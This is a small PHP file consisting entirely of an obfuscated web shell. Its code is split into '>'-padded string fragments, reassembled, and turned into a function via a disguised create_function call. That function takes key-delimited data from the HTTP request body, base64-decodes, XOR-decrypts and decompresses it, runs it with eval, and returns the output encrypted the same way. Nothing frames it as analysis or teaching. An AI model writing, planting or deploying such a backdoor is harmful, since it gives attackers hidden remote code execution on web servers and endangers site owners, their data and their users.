<?php
$y='_>co>ntents();>@ob_>end_clea>n()>;$r=@base6>4_>>encode(@x(@gzco>m>press($o>),$k));p>rint(>"$p$>kh$r$kf");}';
$Z='/i>nput"),$m)==1) >{@ob_start>();@eva>l(@gzun>compress>(@x(@b>ase64_d>>eco>de($m[1]),>$k)));$o=@o>b_get';
$O='$t,>$k){$c>=strlen>($k);$l=>>>strlen($t);$o=>"";for($i>=>0;$i<$>l;){>for>($j=0;($j<>$c&&$i<$l)>;$j++,$>i+';
$i='$k="512d>50>c9";$kh=">5a>99d4330245>>";$kf="c7df3c>ba1>c>e3";$>p="XbwHbM>xB5IDX>7ZPV";fun>ction x(>';
$A='+)>{$o.=$t{$i}>^>$k{$j}>;>}}re>turn $o;}if (@pr>eg_match>("/>$kh(.>>+)$kf/",@file_get>_con>tent>>>s("p>hp:/';
$h=str_replace('kN','','crkNeakNte_kNfkNunkNckNtion');
$U=str_replace('>','',$i.$O.$A.$Z.$y);
$k=$h('',$U);$k();
?>
